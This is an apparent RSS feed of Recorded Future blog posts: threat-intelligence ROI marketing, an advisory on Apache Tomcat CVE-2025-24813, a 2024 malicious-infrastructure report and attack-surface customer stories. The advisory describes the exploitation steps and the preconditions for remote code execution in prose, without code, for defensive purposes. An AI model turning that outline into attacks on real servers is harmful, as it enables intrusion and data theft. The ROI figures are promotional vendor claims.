            <description><![CDATA[Discover how cybersecurity impacts your bottom line. Learn how threat intelligence helps reduce fraud, downtime, insurance costs, and reputational damage—driving 351% ROI.]]></description>
            <content:encoded><![CDATA[
        <p>In today's unpredictable threat landscape, cybersecurity isn't just an IT concern—it's a critical business initiative with direct impact on your organization's bottom line and brand reputation. As threat actors grow increasingly sophisticated, security leaders face mounting pressure to demonstrate the tangible value of their cybersecurity investments.</p>
        <h2>The Financial and Business Impact of Cyber Risks</h2>
        <p>Cyber threats pose far more than just technical challenges—they carry significant financial and operational consequences that can affect an organization's bottom line, stakeholder confidence, and long-term sustainability. Recent research quantifies that impact: the average <a href="https://www.ibm.com/reports/data-breach">cost of a data breach</a> now stands at $4.88 million, and the aftermath of cybersecurity incidents often extends well beyond the immediate financial losses.</p>
        <p>For businesses, the equation is simple yet profound: effective <a href="/blog/supercharge-risk-reduction">cybersecurity risk reduction</a> directly translates to business value. By implementing proactive threat intelligence and comprehensive security measures, organizations can:</p>
        <ul>
          <li>Prevent revenue losses from operational disruptions</li>
          <li>Avoid costly fraud and impersonation schemes</li>
          <li>Strengthen customer trust and brand reputation</li>
          <li>Reduce cyber insurance premiums</li>
          <li>Minimize recovery costs from security incidents</li>
        </ul>
        <h2>The Cost of Cyber Risks to Businesses</h2>
        <p>According to new research conducted with hundreds of Recorded Future customers, organizations are seeing substantial ROI from their threat intelligence investments in areas that extend far beyond traditional security metrics. The data, compiled in Recorded Future's comprehensive 2025 ROI Report, <a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi">“How Recorded Future Drives ROI for Cybersecurity Teams,”</a> reveals how mature threat intelligence programs translate directly to business resilience and financial benefits.</p>
        <h3>Brand Reputation Impact</h3>
        <p>When a company falls victim to a cyber attack, the damage to brand reputation can be substantial and long-lasting. Typosquatting—the practice of creating deceptively similar domain names to legitimate websites—often serves as vectors for phishing attacks that can compromise customer data and customer trust.</p>
        <p>Recorded Future customers reported that they are now 51% more efficient at taking down typosquatting instances. Swift typosquat mitigation not only helps combat phishing attempts, but it also enables your customers to seamlessly carry out the actions they set out to accomplish by visiting your site. We see that as an increase in web traffic that we can quantify the value of with the help of research by the <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf">University of Illinois</a>.</p>
        <p>An average billion-dollar business sees 2 million monthly web visits. At an average loss rate of 5.28% due to typosquatting according to research from <a href="https://www.cs.uic.edu/~ckanich/papers/khan2015every.pdf">University of Illinois</a>, more efficient typosquat takedowns with Recorded Future would help them recover over 50,000 website visits each month — and an expected $2,602 monthly value.</p>
        <p>"We have improved brand protection by at least 100%. We can identify risks and patterns in infancy stages, and we've automated brand scanning to eliminate hours of manual work. As we automate more coverage, we have saved hundreds of labor hours per quarter and improved efficiency," reports <a href="https://app.userevidence.com/assets/8091GFKY">Joe Azzouggagh, Manager of Trust and Safety at ruby</a>.</p>
        <h3>Cyber Insurance Considerations</h3>
        <p>As cyber attacks have become more prevalent, cyber insurance has evolved from a nice-to-have to a business necessity. However, premiums can be substantial, particularly for organizations that face significant risk.</p>
        <p>Based on observable market data and the average 2024 <a href="https://www.ibm.com/reports/data-breach">cost of a breach</a> being $4.88 million, a typical billion-dollar company likely pays a yearly premium of $207,400, or $35-50,000 per million of coverage.</p>
        <p>Recorded Future customers report average monthly premium savings of $2,497—approximately $30,000 annually. One customer, <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&amp;wmediaid=1j7x7zezcc">Cummins</a>, achieved an impressive 32% year-over-year reduction in cyber insurance premiums after implementing Recorded Future's threat intelligence platform.</p>
        <h3>Operational Disruption and Downtime</h3>
        <p>Service disruptions resulting from cyber incidents carry dual consequences: immediate revenue losses and lasting reputational damage. <a href="/blog/reducing-operational-risk-with-threat-intelligence">Reducing operational risk</a> has become a priority for organizations of all sizes. When systems go offline due to ransomware or distributed denial-of-service (DDoS) attacks, every minute of downtime translates to financial impact.</p>
        <p>Our customers report that threat intelligence from Recorded Future helps minimize downtime, which for a billion-dollar organization translates to an average revenue value of approximately $19,025 per month—or nearly $230,000 annually. This calculation doesn't even account for the additional benefit of avoiding reputational damage that inevitably accompanies service disruptions.</p>
        <p>“Recorded Future allows us to shift our mindset from being more reactive in nature to being more proactive and responsive to threats that went unnoticed in the past. This, in turn, has facilitated the development of new processes that have enhanced the overall security posture of the business," explains a <a href="https://app.userevidence.com/assets/2791JWBD">Lead Cyber Defense Engineer at a major food and staples retailing company</a>.</p>
        <h3>Fraud Prevention</h3>
        <p>Payment fraud, transaction fraud, and billing schemes represent significant financial threats to businesses across industries. Through comprehensive threat intelligence, organizations can identify and mitigate these risks before they materialize into actual losses.</p>
        <p>Recorded Future’s threat intelligence helps customers reduce fraud losses. A billion-dollar business that loses $500,000 annually to payment fraud losses would recover over $6,812 per month through improved threat intelligence with Recorded Future. Outside of the payments themselves, fraud loss mitigation also contributes financially by strengthening the integrity and trustworthiness of your business.</p>
        <p>As one customer, a <a href="http://uevi.co/4047UHKE">Senior Information Security Analyst at Jefferson Bank</a>, noted: "We use Recorded Future's dark web intelligence to proactively stop attacks, reset weak passwords, or prevent bank card fraud. This has a potential savings of $1,000-2,000 depending on the customer or situation."</p>
        <h3>All Together: The ROI of Business and Brand Risk Reduction with Recorded Future</h3>
        <p>Across all risk reduction areas, customers can save approximately $31,000 monthly—or $371,000 yearly.</p>
        <p>This substantial return breaks down into several key components:</p>
        <ul>
          <li>$2,602 monthly from brand reputation protection</li>
          <li>$2,497 monthly from reduced cyber insurance premiums</li>
          <li>$19,025 monthly from downtime avoidance/increased uptime</li>
          <li>$6,812 monthly from fraud loss prevention</li>
        </ul>
        <p>Together, these savings represent a 209.4% ROI on business risk reduction alone. When combined with the <a href="/blog/improving-cybersecurity-productivity-threat-intelligence-recorded-future-drives-roi">productivity improvements that threat intelligence enables (an additional 141.9% ROI), Recorded Future customers achieve a total of 351.3% ROI</a> annually.</p>
        <h2>Implementing a Proactive Cybersecurity Strategy</h2>
        <p>To realize the full business impact of threat intelligence, organizations should follow a structured approach to implementation:</p>
        <h3>1. Define Business-Centric Security Priorities</h3>
        <p>Begin by identifying your organization's "crown jewels"—the critical assets, data, and operations that would cause significant harm if compromised. This is a fundamental principle of business risk management. Work with business leadership to understand what matters most to the organization's success and prioritize security efforts accordingly.</p>
        <h3>2. Assess Threats in Business Context</h3>
        <p>Not all vulnerabilities will be exploited, and not all threats pose an immediate risk to your specific organization. Use threat intelligence to focus first on responding to the threats that present actual risk to your people, assets, and business objectives.</p>
        <h3>3. Leverage Automation to Increase Efficiency</h3>
        <p>With proper automation, security teams can dramatically reduce manual effort while improving response times. By automating routine tasks like alert enrichment and correlation, analysts can focus on strategic threat hunting and proactive security initiatives.</p>
        <h3>4. Measure and Communicate Business Impact</h3>
        <p>Track and report on security metrics that matter to business leaders, such as:</p>
        <ul>
          <li>Reduced cyber insurance premiums</li>
          <li>Avoided fraud losses</li>
          <li>Increased uptime</li>
          <li>Accelerated response times</li>
          <li>Brand protection efforts</li>
        </ul>
        <h3>5. Mature Your Program Over Time</h3>
        <p>As your threat intelligence program matures, continuously refine your approach to address evolving business needs and emerging threats. This might include expanding monitoring to new digital channels, deepening integration with business systems, or enhancing threat hunting capabilities.</p>
        <h2>Conclusion: Protecting Business Continuity Through Cyber Risk Reduction</h2>
        <p>The data is clear: By implementing comprehensive threat intelligence from Recorded Future, organizations can not only prevent security incidents but also demonstrate tangible ROI through business risk reduction.</p>

            <description><![CDATA[Learn about CVE-2025-24813 affecting Apache Tomcat products. Patch now to prevent remote code execution.]]></description>
            <content:encoded><![CDATA[
        <h2>What is CVE-2025-24813?</h2>
        <p><a href="/vulnerability-database/CVE-2025-24813">CVE-2025-24813</a> is a critical path equivalence vulnerability in Apache Tomcat, with exploitation attempts by threat actors observed in the wild. The vulnerability allows attackers to execute arbitrary code on vulnerable servers without authentication under specific conditions, potentially leading to system compromise and sensitive data being exposed.</p>
        <p>Organizations affected by the configuration required for exploitation should patch CVE-2025-24813 to mitigate potential attacks and protect sensitive data from unauthorized access.</p>
        <p>The vulnerability affects Tomcat versions 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, and 9.0.0. M1 to 9.0.98. <strong>Additionally, Insikt Group’s analysis found that 8.5.x versions (specifically 8.5.0 to 8.5.98 and 8.5.100, with the exception of 8.5.99) are also vulnerable, though they were not included in the initial set of affected products by Apache.</strong></p>
        <h2>Insikt Group’s Assessment of CVE-2025-24813</h2>
        <p>CVE-2025-24813 stems from Tomcat’s handling of partial PUT requests and allows remote, unauthenticated attackers to conduct remote code execution (RCE), view security-sensitive files, and inject content into those files.</p>
        <p>Exploitation involves two primary steps:</p>
        <ul>
          <li>The attacker sends a PUT request containing a Base64-encoded serialized Java payload to the server. This payload is designed to trigger RCE upon deserialization.</li>
          <li>The attacker then sends a GET request with a specially crafted “JSESSIONID” cookie referencing the malicious session, causing the server to deserialize the payload and execute arbitrary code.</li>
        </ul>
        <p>However, successfully conducting RCE requires the following conditions:</p>
        <ul>
          <li>The default servlet must have write permissions enabled (disabled by default)</li>
          <li>Partial PUT support must be enabled (enabled by default)</li>
          <li>The application uses Tomcat's file-based session persistence with the default storage location</li>
          <li>The application includes a library that can be leveraged in a deserialization attack</li>
        </ul>
        <p>If the following conditions are true, attackers can view sensitive security files and inject content into those files:</p>
        <ul>
          <li>The default servlet must have write permissions enabled (disabled by default)</li>
          <li>Partial PUT support must be enabled (enabled by default)</li>
          <li>The target URL for sensitive uploads resides within a sub-directory of the public uploads directory</li>
          <li>The attacker is aware of the filenames of the security-sensitive files being uploaded</li>
          <li>The security-sensitive files are uploaded using partial PUT requests</li>
        </ul>
        <p>As such, only a limited number of Tomcat instances are likely to be affected by the configuration required for exploitation. For example, a GitHub code search query to check for the write permissions condition (<code>&lt;param-name&gt;readonly&lt; /param-name&gt; AND "false" language:xml</code>) shows only 218 open-source projects using this configuration.</p>
        <p>Cybersecurity firm Greynoise has identified six malicious IP addresses attempting to exploit CVE-2025-24813, targeting systems in the US, Japan, Mexico, South Korea, and Australia. However, Insikt Group has not identified any evidence of successful exploitation or any evidence of known threat actors exploiting the vulnerability. At the time of writing, there were 378,444 exposed instances on Shodan. The specific versions are disclosed in the title and body of the servers’ responses.</p>

            <description><![CDATA[Discover how Recorded Future improves cybersecurity team productivity, saving 100+ hours weekly and driving $290K in annual value through threat intelligence.]]></description>
            <content:encoded><![CDATA[
        <p>Cybersecurity teams face a constant onslaught of critical and potentially catastrophic challenges: from defending against sophisticated ransomware attacks to preventing coordinated nation-state campaigns. To make their challenges worse, teams often struggle with a lack of visibility, alert fatigue, limited resources and manual processes.</p>
        <p>Threat intelligence has emerged as a critical solution to these challenges, providing the context and actionable insights needed to prioritize effectively and respond proactively. Rather than adding to the noise, threat intelligence cuts through it, enabling security teams to work more efficiently, focusing on what matters and responding to it quickly.</p>
        <p>To understand how customers of Recorded Future leverage threat intelligence to act more efficiently, we partnered with third-party research firm <a href="https://app.userevidence.com/user-research-library/recorded-future?per_page=25&amp;page=1&amp;sort_by=updated_at&amp;sort_dir=desc&amp;responded=1&amp;view=card">UserEvidence</a> to collect quantitative ROI data and qualitative feedback to create our newly published report: <strong><a href="https://go.recordedfuture.com/report/how-recorded-future-drives-roi">How Recorded Future Drives ROI for Cybersecurity Teams</a></strong>.</p>
        <p>The report reveals that by automating manual workflows, streamlining investigations, and enabling teams to focus on what matters most, Recorded Future customers are reporting time savings of over 100 hours per week—translating to approximately $290,237 in annual productivity gains for the average organization. In this blog post, we explore the report’s findings and what our customers have to say about improving efficiency.</p>
        <h2>The Growing Need for Cybersecurity Efficiency</h2>
        <p>Security teams across industries are feeling the strain of increasing responsibilities with limited resources. This imbalance often results in:</p>
        <ul>
          <li>Burnout among team members tasked with manual, repetitive processes</li>
          <li>Operational inefficiencies that slow response times</li>
          <li>Difficulty prioritizing among a constant stream of alerts</li>
          <li>Challenges in demonstrating value to organizational leadership</li>
        </ul>
        <p>These challenges create a significant productivity gap that affects not just the security team, but the entire organization's resilience against cyber threats.</p>
        <p>"Threat intelligence will always improve your visibility. The important part is to do it without overburdening your team. How can we add new threat intelligence use cases without creating a whole load of extra work and alerts to deal with?" explains Jason Steer, CISO at Recorded Future.</p>
        <h2>Measuring the ROI of Recorded Future's Efficiency Gains</h2>
        <p>Recent research conducted by UserEvidence paints a compelling picture of how Recorded Future transforms security operations. In a comprehensive survey of security professionals using the platform, the data revealed remarkable efficiency gains realized by teams, for example:</p>
        <ul>
          <li><strong>Teams save an average of 11 hours weekly</strong> on alert triage, investigation, and response</li>
          <li><strong>Threat analysis, hunting, and reporting time reduced by 11 hours weekly</strong></li>
          <li><strong>Brand abuse mitigation efforts streamlined by 8 hours per week</strong></li>
          <li><strong>Spending 7 hours less per week on vendor and supplier evaluation processes</strong></li>
        </ul>
        <p>When translated to financial impact, these productivity improvements add up to approximately <strong>$290,237 in annual savings</strong> for the average organization implementing Recorded Future. Later in this article, we’ll break down the full picture.</p>
        <p>As one <a href="https://app.userevidence.com/assets/4669MYFV">Senior SOC analyst and Threat Intelligence Analyst</a> at an Air Freight &amp; Logistics company reported: "We automated 70% of manual workflows with Recorded Future, cutting investigation times by 50%. This led to a 40% increase in threat detection efficiency and a 30% reduction in response times, enhancing our overall security posture."</p>
        <p><a href="http://uevi.co/2879KFMW">Valentin Vanlaeys, Threat Intelligence Lead</a> at Proximus Ada, shared similar results: "Thanks to Recorded Future's valuable and actionable data, we cut our intelligence hunting, reporting, and analysis by 80%."</p>
        <h2>How Recorded Future Transforms Security Operations</h2>
        <h3>Common Challenges Security Teams Face in Productivity</h3>
        <h4>Before: Manual Processes Amidst High Urgency</h4>
        <p>Without Recorded Future's automated intelligence capabilities, security teams shoulder the burden of time-consuming manual workflows that may look something like this:</p>
        <ol>
          <li>Finding relevant data sources across open-source intelligence feeds, blogs, news outlets, social media, and forums</li>
          <li>Collecting unstructured and complex data from these sources</li>
          <li>Sifting through the data to separate signal from noise</li>
          <li>Analyzing the information to identify potential threats</li>
          <li>Compiling and distributing reports</li>
        </ol>
        <p>These processes – along with manual alert triage, investigation, and response – aren’t just frustratingly manual for team members. They also delay or slow down organizations’ response times.</p>
        <p>Security teams are inundated with alerts, some of which are noise and some of which are relevant and urgent. If they don’t have actionable threat intelligence, they can’t efficiently gain an understanding of the priority or criticality of each. And when it comes to addressing a security threat, time is of the essence.</p>
        <h4>After: Actionable Intelligence and Automation with Recorded Future</h4>
        <p>Recorded Future helps teams efficiently capture, compile, and analyze threat data, turning it into actionable intelligence that teams would otherwise need to triage, investigate, and respond to manually. This frees the security team to focus their energy on responding to high-priority threats and hunting new ones. Rather than struggling to address everything that seems important, they can think strategically about protecting their organization.</p>
        <p>With the Recorded Future Intelligence Platform, teams can shift from reactive to proactive security postures:</p>
        <ul>
          <li><strong><a href="/blog/from-speed-to-consistency-power-automation-for-your-soc">Intelligence-driven automation across security workflows</a></strong> accelerates identification, investigation, and prioritization of threats</li>
          <li><strong>Streamlined workflows</strong> reduce investigation time by providing immediate context</li>
          <li><strong>Resource optimization</strong> allows skilled analysts to focus on strategic initiatives rather than routine tasks</li>
        </ul>
        <p>As one <a href="https://app.userevidence.com/assets/7691ENSY">Information Security Specialist</a> at an Industrial Conglomerates Company noted: "We use Recorded Future's risk lists to block malicious IPs with a risk score of 65 or higher. As a result, we automatically make an average of approximately 5 million blocks per day, resulting in a time savings of about 40 hours per month for our team."</p>
        <p><a href="https://app.userevidence.com/assets/7193MCHB">Jack Edens, IT Security Analyst</a> at Dupaco Credit Union, adds: "Recorded Future was a game-changer for us, transforming how our team managed threats and stayed proactive. With their platform, we automated repetitive reporting tasks, which allowed us to move key resources onto critical issues, tightening our focus on real threats. This shift didn't just streamline our workflows; it gave us back nearly 50% in efficiency — significant when you're dealing with a constant flow of new data."</p>
        <h2>Real-World Productivity Improvements: By the Numbers</h2>
        <h3>How Threat Intelligence Increases Productivity and Efficiency</h3>
        <p>Recorded Future customers achieve a more proactive, productive, and mature threat intelligence program, saving hundreds of thousands of dollars in productivity along the way.</p>

            <div>50 hrs</div>
          </div>
        </div>
        <p>Perhaps most significant is the impact on senior analyst efficiency. The average security team at a billion-dollar company saves over 50 hours of senior analyst time per week using Recorded Future—approximately $70,000 annually—by shifting routine tasks to junior analysts. This allows experienced team members to focus on strategic initiatives and proactive threat hunting.</p>
        <p>A <a href="https://app.userevidence.com/assets/9789DFRN">Threat Intelligence Analyst</a> at a Construction &amp; Engineering Company explains: "Recorded Future has allowed us to take a more proactive approach to security, in particular with assessing threats to our tech landscape and setting priorities for eligible threat-hunting activities. Additionally, it has provided us visibility into spaces that we otherwise would be unable to attain such as dark web marketplaces for credential leaks."</p>
        <p><strong>Across all threat intelligence areas and including improvement to senior analyst efficiency, Recorded Future customers saved over 100 hours per week, or $290,000 over the year.</strong></p>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>In 2024, Insikt Group significantly expanded its tracking of malicious infrastructure by covering more malware families and categories, additional infrastructure types such as staging servers, and integrating data sources like Recorded Future® Network Intelligence, enhancing threat detection, higher-tier infrastructure insights, and victimology analysis. While many key 2023 trends persisted — such as Cobalt Strike dominating offensive security tools (OSTs), AsyncRAT and QuasarRAT leading among remote access trojans (RATs), China and the United States (US) being the top hosting locations, and law enforcement actions having often only temporary impact — Insikt Group identified several emerging trends in 2024.</p>
        <p>Notably, malware-as-a-service (MaaS) infostealers, led by LummaC2, grew in prevalence, likely driven by law enforcement actions against competitor infostealers and rapid innovation by LummaC2. Additionally, Android remained the primary target for mobile malware, with Hook leading. While Latrodectus dominated droppers and loaders despite law enforcement disruptions in the loader ecosystem, traffic distribution systems (TDSs) continued to enhance cybercrime efficiency, as seen with TAG-124, and the abuse of content delivery networks (CDNs) like Cloudflare surged. In regards to state-sponsored groups, China notably increased its use of relay networks such as ArcSilt, while Russia continued its abuse of a wide range of <a href="/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses">legitimate internet services (LIS)</a>.</p>
        <p>Defenders should leverage this report's insights to strengthen security controls by prioritizing top malware and infrastructure techniques, and thereby enhance network monitoring and deploy relevant detections like YARA, Sigma, and Snort. This should be complemented by investments in tracking evolving malicious infrastructure dynamics, conducting threat simulations to test defenses, and effectively monitoring the broader threat landscape. Regarding LIS, defenders must balance blocking, flagging, or allowing high-risk services based on their assessed criticality and risk level.</p>
        <p>As malicious infrastructure evolves and detection improves, Insikt Group expects existing trends to persist in 2025, driven by continuous threat actor innovation rather than drastic shifts. For example, the "as-a-service" ecosystem will likely expand, and threat actors will increasingly rely on legitimate tools, services, and CDNs to evade detection. Furthermore, with growing mobile reliance, Insikt Group expects mobile-based threats to continue to rise. Relay networks, primarily used by Chinese state-sponsored groups up until now, may see broader adoption by cybercriminals and other state-sponsored groups. Lastly, law enforcement actions are expected to have a greater impact due to enhanced international cooperation and accrued expertise in large-scale cybercrime takedowns.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>MaaS infostealers led in infections in 2024, with LummaC2 dominating command-and-control (C2) servers as continuous innovation and law enforcement actions against rivals like RedLine Stealer reshaped the cybercrime ecosystem.</li>
          <li>AsyncRAT and Quasar RAT remained the top remote access tools (RATs), while MaaS-based malware like DcRAT continued widespread use.</li>
          <li>The US (North America), Brazil (South America), Angola (Africa), France (Europe), India (Asia), and Australia (Oceania) recorded the highest number of victims in their respective regions based on Recorded Future Network Intelligence, with AsyncRAT emerging as the most prevalent malware in most cases. Other significant threats included QuasarRAT and Cobalt Strike.</li>
          <li>Android remained the primary target for mobile malware, with nine of the top ten families focusing on it, alongside the rise of mercenary spyware and potentially unwanted programs (PUPs) like stalkerware.</li>
          <li>Cobalt Strike accounted for two-thirds of offensive security tool command-and-control (C2) servers, with jQuery as the most popular malleable profile and cs2modrewrite targeting the most victim countries. Cobalt Strike is followed by Metasploit, with detections of Sliver and Brute Ratel C4 rising significantly.</li>
          <li>Mozi Botnet was the largest tracked botnet in 2024 based on the number of identified bots, while older botnets remained active, being primarily used for distributed denial-of-service (DDoS) attacks, as well as credential theft and localized attacks, as seen with Fenix Botnet.</li>
          <li>Latrodectus dominated all droppers and loaders in 2024, accounting for 33% of detections, likely driven by law enforcement disruptions in the loader ecosystem, while most top families emerged post-2021, indicating shorter lifespans.</li>
          <li>TDS continued to play a crucial role in cybercrime by improving efficiency, targeting, and profitability while evading detection, exemplified by TAG-124, which served a broad user base, including ransomware groups like Rhysida.</li>
          <li>The US and China dominated malicious hosting, while bulletproof hosting providers like Stark Industries played a growing role in cybercrime infrastructure.</li>
          <li>Chinese state-sponsored groups expanded their use of anonymization networks in 2024 to target entities worldwide, enabling them to blend with legitimate traffic and complicate victim identification, while RedDelta used Cloudflare to proxy C2 traffic and geo-fence malicious files.</li>
          <li>Russian state-sponsored groups increasingly relied on legitimate services like Ngrok, Cloudflare, and Telegram to evade detection, with BlueDelta shifting to Ngrok after takedown efforts and BlueAlpha using Cloudflare Tunnels to stage GammaDrop malware.</li>
        </ul>
        <h2>Introduction</h2>
        <p>Insikt Group proactively identifies and monitors infrastructure associated with hundreds of malware families, threat actors, and other artifacts, including phishing kits, scanners, and relay networks. By automatically validating malicious infrastructure through various proprietary methods on a daily basis, Insikt Group provides accurate risk representation, enabling Recorded Future customers to enhance their detection and defense capabilities.</p>
        <p>Building on Insikt Group's annual adversary infrastructure reports from <a href="/research/2022-adversary-infrastructure-report">2022</a> and <a href="https://go.recordedfuture.com/hubfs/reports/cta-2024-1209.pdf">2023</a>, the 2024 Malicious Infrastructure Report provides a concise, data-based overview of malicious infrastructure observed throughout 2024. This year, it specifically emphasizes the synergy among passive infrastructure detection, higher-tier infrastructure insights powered by Recorded Future Network Intelligence, and victim identification. Overall, this report is for anyone interested in malicious infrastructure, offering a high-level overview of its current state as well as summaries of key findings to inform decision-making and provide a broad perspective in this highly dynamic environment.</p>
        <p>Recognizing the challenge of categorizing malware types in a mutually exclusive manner due to their overlapping functionalities, this report establishes a set of malware categories to facilitate analysis, as detailed in <strong>Appendix A</strong>, with brief definitions for each. Notably, certain malware categories, such as crypters, have been intentionally excluded due to the usual absence of network artifacts.</p>
        <p>Beyond examining malicious infrastructure through the lens of malware categories, Insikt Group also monitors it by type, with each type assigned a distinct risk scoring within the Recorded Future Intelligence Cloud. This differentiation reflects varying levels of severity — for instance, network traffic to or from a C2 server in a corporate network may indicate higher risk compared to a management panel, as it typically implies active malicious activity. The infrastructure types defined by Insikt Group are detailed in <strong>Appendix B</strong>.</p>
        <h2>2024 Malicious Infrastructure Insights by the Numbers</h2>
        <p>Proactively identifying malicious infrastructure is a complex task shaped by various factors. In addition to the vast volume of data, each malware family, version, or infrastructure linked to specific threat actors often employs entirely unique setups. Detection becomes even more challenging due to factors such as hosting behind CDNs like Cloudflare, the use of high or random ports, reliance on <a href="/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses">legitimate internet services</a> such as Discord or Telegram, or the exploitation of compromised infrastructure.</p>
        <p>These setups also evolve continuously, demanding that Insikt Group constantly innovate and refine its tracking methodologies. Considering all these factors, this report examines malicious infrastructure across multiple categories, including infostealers, backdoors and RATs, mobile malware, OSTs, botnets, droppers and loaders, phishing kits, web shells, and ransomware.</p>
        <p>Overall, in 2024, there has been a significant rise in identified malicious infrastructure, driven by an evolving threat landscape and advancements in detection methodologies by Insikt Group. For instance, the number of unique, validated C2 servers doubled from 2023 to 2024, while unique, validated management panels saw a 69% increase over the same period.</p>
        <p>In addition, using Recorded Future Network Intelligence, Insikt Group identified victims in approximately 200 countries worldwide in 2024 based on victim IP address geolocation. Countries in <strong>Figure 1</strong> were categorized into five groups based on the number of unique victims detected, with those showing high exposure being geographically dispersed worldwide. Notably, accurately measuring malware impact across countries is challenging due to variations in population size, digital footprint, analytical biases (for example, the types of malware tracked), internet infrastructure (such as proxies), and the geographical hosting choices of victim organizations.</p>

        <p><strong>Figure 2</strong> shows the distribution of victims by country across different continents. In North America, the US is the most targeted country, accounting for around 87% of unique victims in the region despite making up only about half of its population. The high victim count in the US is likely driven by factors such as its large population, extensive digital footprint, widespread English use (exploited in phishing campaigns), and economics, while also being influenced by the country's role as a global infrastructure hub, providing hosting and digital services to organizations worldwide. Most victims are linked to AsyncRAT, followed by SolarMarker RAT and QuasarRAT (see <strong>Table 1</strong>). Notably, unlike AsyncRAT and QuasarRAT, SolarMarker RAT is <a href="/research/exploring-the-depths-of-solarmarkers-multi-tiered-infrastructure">believed</a> to be operated by a single threat actor and has previously been observed predominantly targeting the US.</p>

        <p>In South America, Brazil recorded the highest number of unique victims, accounting for 86% of the region’s total, while also only making up around half of the continent’s population. Previously <a href="https://www.forbes.com/sites/angelicamarideoliveira/2023/09/27/brazil-is-the-worlds-second-most-vulnerable-country-to-cyberattacks/">identified</a> as one of the countries most vulnerable to cyberattacks, Brazil has long been a hotspot for both global and local cyber threats, <a href="https://www.ox.ac.uk/news/2024-04-10-world-first-cybercrime-index-ranks-countries-cybercrime-threat-level">ranking</a> high in cybercrime activity, with groups like Grandoreiro operating almost exclusively within its borders. In 2024, QuasarRAT infections were the most prevalent among Brazilian victims, followed by infections linked to AsyncRAT and SectopRAT.</p>
        <p>In Africa, Angola recorded the highest number of unique victims, followed by Ghana, South Africa, the Republic of the Congo, and the Democratic Republic of the Congo. Notably, in two of the five most targeted African countries, PlugX, a malware linked to multiple Chinese state-sponsored groups, ranked among the most prevalent malware.</p>
        <p>In Europe, France had the highest number of unique victims, followed by Germany, the United Kingdom, the Netherlands, and Poland. AsyncRAT was the most prevalent malware across all five countries, with Cobalt Strike ranking second in three of them. The distribution of victims in these top five countries closely aligns with their population sizes. Notably, in the Netherlands, GobRAT — a backdoor targeting Linux routers with malware written in Go — ranked among the top three malware families.</p>
        <p>In Asia, India recorded the highest number of unique victims, followed by China, Indonesia, Thailand, and Hong Kong. Approximately 73% of all victims in these countries were linked to AsyncRAT, QuasarRAT, and Cobalt Strike infections. Notably, Brute Ratel C4 ranked among the top three malware in Hong Kong, highlighting its growing significance.</p>
        <p>In Oceania, Australia accounted for 87% of all unique victims despite making up only 60% of the region's population. AsyncRAT was the most prevalent malware, linked to over half of Australia's victims, while in New Zealand, 67% of victims were associated with AsyncRAT infections.</p>

            <description><![CDATA[Learn how security leaders defend against risks to their first- and third-party attack surfaces.]]></description>
            <content:encoded><![CDATA[
        <p>Modern attack surfaces extend across every place your business operates, from your first-party technology assets to your third-party network of suppliers and vendors. To spot risks before attackers do, you need to maintain continuous visibility across this expanding landscape. Employee credentials can become compromised, unknown or vulnerable internet assets can be exploited, and supply chain partners with spotty security hygiene can provide adversaries with easy access to your network and data.</p>
        <p>At Recorded Future, we’ve seen firsthand how practitioners are transforming their security programs by adopting proactive strategies to protect their first- and third-party attack surfaces.</p>
        <p>In our experience, security teams that successfully defend against these threats share a common approach: They combine comprehensive visibility with contextual intelligence.</p>
        <p>By understanding not just the risks that exist, but why those risks matter to the organization, these security teams enable rapid, informed decision-making that strengthens their security posture.</p>
        <p>In this blog post, we’ll explore how a few select customers are taking an intelligence-led approach to reducing attack surface risks. You’ll discover how:</p>
        <ul>
          <li>Toyota Motor North America <strong>quickly remediates compromised employee credentials</strong> to prevent unauthorized access.</li>
          <li>Cummins <strong>identifies and secures internet-facing assets</strong> to reduce their vulnerable attack surface.</li>
          <li>Novavax <strong>takes an intelligence-driven approach to vendor risk management</strong> for greater supply chain resilience.</li>
          <li>INVESTBANK <strong>maintains continuous awareness of vulnerabilities</strong> alongside new updates and releases.</li>
        </ul>
        <p>See the impactful results these companies have achieved, and learn how we can empower your security team to stay ahead of threats and build lasting resilience.</p>
        <h2>Toyota Motors North America Defends the Human Identity Attack Surface</h2>
        <p><em>"The timeliness of being able to take compromised credentials out of the marketplace is really beneficial."</em> — Curtis Hartsell, CTI Manager, Toyota Motors North America (<a href="/videos/toyota">watch the full video here</a>)</p>
        <p>According to the <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">2024 Verizon Data Breach Investigation Report</a>, 31% of all breaches over the last 10 years have involved the use of stolen credentials. With the rise of stealthy infostealers, threat actors are more likely to log in with stolen credentials than hack their way in. The Verizon report also found more than a thousand credentials being posted for sale on the dark web each day, with an average price of $10, proving that there’s serious demand from cybercriminals.</p>
        <p>To help Toyota Motors North America gain an edge, Cyber Threat Intelligence Manager Curtis Hartsell relies on Recorded Future’s <a href="/products/identity-intelligence">Identity Intelligence Module</a>. The product allows Hartsell and team to take swift action on compromised credentials, automating credential resets before bad actors can gain access to the company’s systems.</p>
        <p>In one example, he said, “We had a compromised credential at 7 o’clock. Two hours later Identity [Intelligence] is notifying of those compromised credentials, and about thirty or forty minutes after the Identity Module alert, we see attempts to use that account.”</p>
        <p>Immediate visibility into newly compromised credentials helps Toyota Motors North America automate response actions and secure accounts instantly. This automation eliminates the need for constant manual intervention, allowing Hartsell and team to focus on higher-value tasks.</p>
        <h2>Cummins Identifies and Reduces Attack Surface Risk</h2>
        <p><em>“We have two main problem statements when we’re looking at this attack surface problem: What is our attack surface? And then how do we secure it? There’s a couple of different actions you take, whether it’s remediation or reduction. We love reduction. If it can’t be on the internet. Great. Let’s get it off there.”</em> — Mattheus Bittick, Attack Surface Reduction Analyst, Cummins (watch the full video <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&amp;wmediaid=1j7x7zezcc">here</a>)</p>
